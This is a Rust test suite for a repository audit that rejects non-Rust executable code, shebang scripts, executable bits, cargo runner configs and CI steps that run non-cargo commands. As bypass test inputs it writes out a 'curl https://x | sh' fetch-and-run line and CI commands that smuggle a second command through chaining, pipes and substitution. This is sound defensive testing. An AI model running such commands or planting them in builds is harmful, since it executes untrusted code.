//! R26 gate: the first-party source-language audit rejects non-Rust executable
//! code anywhere outside explicitly declared fixture/vendor exceptions.

use std::fs;
use std::path::{Path, PathBuf};

use xtask::audit_sources::{SourcePolicy, ViolationKind, audit};

const POLICY: &str = r#"
version = 1
rust_extensions = ["rs"]
data_extensions = ["md", "json", "toml", "yaml", "yml", "txt", "lock"]
data_filenames = ["LICENSE", ".gitignore"]
ignored_dirs = ["target", ".git"]
ci_workflow_dirs = [".github/workflows", ".github/actions"]
ci_allowed_actions = ["actions/checkout"]

[[exceptions]]
path = "fixtures"
kind = "fixture"
reason = "Untrusted reviewed-language fixtures; data only."
"#;

fn policy() -> SourcePolicy {
    SourcePolicy::from_toml(POLICY).expect("test policy parses")
}

fn tree(files: &[(&str, &str)]) -> tempfile::TempDir {
    let dir = tempfile::tempdir().expect("tempdir");
    for (rel, body) in files {
        write(dir.path(), rel, body);
    }
    dir
}

fn write(root: &Path, rel: &str, body: &str) -> PathBuf {
    let path = root.join(rel);
    fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
    fs::write(&path, body).expect("write");
    path
}

fn kinds(root: &Path) -> Vec<(String, ViolationKind)> {
    let report = audit(root, &policy()).expect("audit runs");
    report
        .violations
        .into_iter()
        .map(|v| (v.path.to_string_lossy().into_owned(), v.kind))
        .collect()
}

#[test]
fn rust_only_tree_passes() {
    let dir = tree(&[
        ("Cargo.toml", "[workspace]\n"),
        ("crates/a/src/lib.rs", "pub fn a() {}\n"),
        ("crates/a/tests/t.rs", "#[test] fn t() {}\n"),
        ("docs/readme.md", "# docs\n"),
        ("LICENSE", "text\n"),
    ]);
    let report = audit(dir.path(), &policy()).expect("audit runs");
    assert!(report.violations.is_empty(), "{:?}", report.violations);
    assert_eq!(report.files_checked, 5);
}

#[test]
fn python_script_is_rejected() {
    let dir = tree(&[("eval/score.py", "print('x')\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("eval/score.py".into(), ViolationKind::NonRustSource)]
    );
}

#[test]
fn shell_script_is_rejected() {
    let dir = tree(&[("scripts/build.sh", "echo hi\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("scripts/build.sh".into(), ViolationKind::NonRustSource)]
    );
}

#[test]
fn typescript_inside_a_crate_is_rejected() {
    let dir = tree(&[("crates/a/src/worker.ts", "export const x = 1;\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![(
            "crates/a/src/worker.ts".into(),
            ViolationKind::NonRustSource
        )]
    );
}

#[test]
fn unknown_extension_fails_closed() {
    let dir = tree(&[("tools/helper.weird", "???\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("tools/helper.weird".into(), ViolationKind::UnknownFileType)]
    );
}

#[test]
fn extensionless_shebang_script_is_rejected() {
    let dir = tree(&[("bin/run", "#!/bin/sh\necho hi\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("bin/run".into(), ViolationKind::ShebangScript)]
    );
}

#[test]
fn shebang_disguised_as_data_is_rejected() {
    let dir = tree(&[("docs/notes.md", "#!/usr/bin/env python3\nprint(1)\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("docs/notes.md".into(), ViolationKind::ShebangScript)]
    );
}

#[cfg(unix)]
#[test]
fn executable_bit_on_data_file_is_rejected() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tree(&[]);
    let path = write(dir.path(), "docs/run.txt", "echo hi\n");
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(
        kinds(dir.path()),
        vec![("docs/run.txt".into(), ViolationKind::ExecutableFile)]
    );
}

#[cfg(unix)]
#[test]
fn symlink_in_owned_tree_is_rejected() {
    let dir = tree(&[("docs/a.md", "x\n")]);
    std::os::unix::fs::symlink("a.md", dir.path().join("docs/b.md")).expect("symlink");
    assert_eq!(
        kinds(dir.path()),
        vec![("docs/b.md".into(), ViolationKind::Symlink)]
    );
}

#[test]
fn declared_fixture_root_permits_target_language_code() {
    let dir = tree(&[
        ("fixtures/repositories/py-bug/app.py", "def f(): pass\n"),
        ("fixtures/repositories/ts-bug/index.ts", "export {}\n"),
    ]);
    assert!(kinds(dir.path()).is_empty());
}

#[test]
fn undeclared_fixture_directory_is_rejected() {
    let dir = tree(&[("test-data/app.py", "def f(): pass\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("test-data/app.py".into(), ViolationKind::NonRustSource)]
    );
}

#[test]
fn ignored_build_output_is_not_scanned() {
    let dir = tree(&[("target/debug/build/x/out/gen.c", "int x;\n")]);
    assert!(kinds(dir.path()).is_empty());
}

#[test]
fn ci_workflow_calling_non_cargo_command_is_rejected() {
    let workflow = "\
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
      - run: cargo test --workspace --locked
      - run: |
          cargo fmt --all -- --check
          python3 scripts/check.py
";
    let dir = tree(&[(".github/workflows/ci.yml", workflow)]);
    assert_eq!(
        kinds(dir.path()),
        vec![(
            ".github/workflows/ci.yml".into(),
            ViolationKind::CiRunsNonCargo {
                command: "python3 scripts/check.py".into()
            }
        )]
    );
}

#[test]
fn ci_workflow_with_only_cargo_commands_passes() {
    let workflow = "\
jobs:
  test:
    steps:
      - run: cargo run --locked -p xtask -- audit-sources
      - run: >
          cargo clippy --workspace --all-targets --locked -- -D warnings
";
    let dir = tree(&[(".github/workflows/ci.yml", workflow)]);
    assert!(kinds(dir.path()).is_empty());
}

#[test]
fn vendor_exception_requires_existing_inventory() {
    let policy_text = format!(
        "{POLICY}\n[[exceptions]]\npath = \"vendor/third_party/tool\"\nkind = \"vendor\"\nreason = \"pinned upstream\"\ninventory = \"vendor/manifests/tool.json\"\n"
    );
    let policy = SourcePolicy::from_toml(&policy_text).expect("parses");
    let dir = tree(&[("vendor/third_party/tool/main.c", "int main(){}\n")]);
    let report = audit(dir.path(), &policy).expect("audit runs");
    assert_eq!(report.violations.len(), 1, "{:?}", report.violations);
    assert_eq!(
        report.violations[0].kind,
        ViolationKind::MissingVendorInventory
    );

    write(dir.path(), "vendor/manifests/tool.json", "{}\n");
    let report = audit(dir.path(), &policy).expect("audit runs");
    assert!(report.violations.is_empty(), "{:?}", report.violations);
}

#[test]
fn exception_path_escaping_root_is_refused() {
    for bad in ["../outside", "/abs/path", "fixtures/../crates", ""] {
        let text = format!(
            "{POLICY}\n[[exceptions]]\npath = \"{bad}\"\nkind = \"fixture\"\nreason = \"x\"\n"
        );
        assert!(
            SourcePolicy::from_toml(&text).is_err(),
            "exception path {bad:?} must be refused"
        );
    }
}

#[test]
fn vendor_exception_without_inventory_field_is_refused() {
    let text = format!(
        "{POLICY}\n[[exceptions]]\npath = \"vendor/x\"\nkind = \"vendor\"\nreason = \"x\"\n"
    );
    assert!(SourcePolicy::from_toml(&text).is_err());
}

#[test]
fn unknown_policy_key_is_refused() {
    let text = format!("{POLICY}\nallow_python = true\n");
    assert!(SourcePolicy::from_toml(&text).is_err());
}

#[test]
fn this_repository_passes_its_own_policy() {
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    let policy = SourcePolicy::load(&root.join("source-policy.toml")).expect("repo policy loads");
    let report = audit(&root, &policy).expect("audit runs");
    assert!(
        report.violations.is_empty(),
        "repository violates R26: {:?}",
        report.violations
    );
    assert!(report.files_checked > 0);
}

// ---------- review findings 2-4: bypass forms ----------------------------

#[test]
fn rs_file_that_is_really_a_shell_script_is_rejected() {
    let dir = tree(&[("tools/run.rs", "#!/bin/sh\ncurl https://x | sh\n")]);
    assert_eq!(
        kinds(dir.path()),
        vec![("tools/run.rs".into(), ViolationKind::ShebangScript)]
    );
    // Inner attributes are not shebangs.
    let dir = tree(&[("src/lib.rs", "#![forbid(unsafe_code)]\n")]);
    assert!(kinds(dir.path()).is_empty());
}

#[cfg(unix)]
#[test]
fn executable_rs_file_is_rejected() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tree(&[]);
    let path = write(dir.path(), "src/main.rs", "fn main() {}\n");
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(
        kinds(dir.path()),
        vec![("src/main.rs".into(), ViolationKind::ExecutableFile)]
    );
}

#[test]
fn cargo_config_that_can_run_other_programs_is_rejected() {
    for name in [".cargo/config.toml", ".cargo/config"] {
        let dir = tree(&[(
            name,
            "[target.'cfg(all())']\nrunner = [\"python3\", \"tools/h.txt\"]\n",
        )]);
        assert_eq!(
            kinds(dir.path()),
            vec![(name.into(), ViolationKind::CargoConfig)],
            "{name}"
        );
    }
}

fn ci_kind(workflow: &str) -> Vec<ViolationKind> {
    let dir = tree(&[(".github/workflows/ci.yml", workflow)]);
    kinds(dir.path()).into_iter().map(|(_, k)| k).collect()
}

fn assert_ci_rejected(label: &str, workflow: &str) {
    let found = ci_kind(workflow);
    assert_eq!(
        found.len(),
        1,
        "{label}: expected one violation, got {found:?}"
    );
    assert!(
        matches!(
            found[0],
            ViolationKind::CiRunsNonCargo { .. }
                | ViolationKind::CiForbiddenStep { .. }
                | ViolationKind::CiUnparseable
        ),
        "{label}: {found:?}"
    );
}

#[test]
fn ci_chained_shell_command_is_rejected() {
    assert_ci_rejected(
        "&& chain",
        "jobs:\n  t:\n    steps:\n      - run: cargo test && python3 scripts/x.py\n",
    );
    assert_ci_rejected(
        "semicolon",
        "jobs:\n  t:\n    steps:\n      - run: cargo test; python3 x.py\n",
    );
    assert_ci_rejected(
        "pipe",
        "jobs:\n  t:\n    steps:\n      - run: cargo test | sh\n",
    );
    assert_ci_rejected(
        "substitution",
        "jobs:\n  t:\n    steps:\n      - run: cargo test $(python3 x.py)\n",
    );
}

#[test]
fn ci_plain_scalar_continuations_are_rejected() {
    assert_ci_rejected(
        "empty run then plain scalar",
        "jobs:\n  t:\n    steps:\n      - run:\n          python3 scripts/x.py\n",
    );
    assert_ci_rejected(
        "continued plain scalar",
        "jobs:\n  t:\n    steps:\n      - run: cargo test\n          && python x.py\n",
    );
}

#[test]
fn ci_flow_and_quoted_keys_are_parsed() {
    assert_ci_rejected(
        "flow mapping",
        "jobs:\n  t:\n    steps:\n      - {run: python x.py}\n",
    );
    assert_ci_rejected(
        "quoted key",
        "jobs:\n  t:\n    steps:\n      - \"run\": python x.py\n",
    );
}

#[test]
fn ci_custom_shell_is_rejected() {
    assert_ci_rejected(
        "step shell",
        "jobs:\n  t:\n    steps:\n      - run: cargo test\n        shell: python3 {0}\n",
    );
    assert_ci_rejected(
        "defaults shell",
        "defaults:\n  run:\n    shell: python3 {0}\njobs:\n  t:\n    steps:\n      - run: cargo test\n",
    );
}

#[test]
fn ci_script_and_container_actions_are_rejected() {
    for uses in [
        "actions/github-script@v7",
        "docker://python:3.13",
        "./.github/actions/helper",
    ] {
        assert_ci_rejected(
            uses,
            &format!("jobs:\n  t:\n    steps:\n      - uses: {uses}\n"),
        );
    }
    assert!(ci_kind("jobs:\n  t:\n    steps:\n      - uses: actions/checkout@v4\n").is_empty());
}

#[test]
fn ci_unparseable_workflow_fails_closed() {
    assert_eq!(
        ci_kind("jobs: [unclosed\n"),
        vec![ViolationKind::CiUnparseable]
    );
}

#[test]
fn composite_action_steps_are_checked() {
    let dir = tree(&[(
        ".github/actions/helper/action.yml",
        "runs:\n  using: composite\n  steps:\n    - run: python3 x.py\n      shell: bash\n",
    )]);
    let found = kinds(dir.path());
    assert_eq!(found.len(), 1, "{found:?}");
}
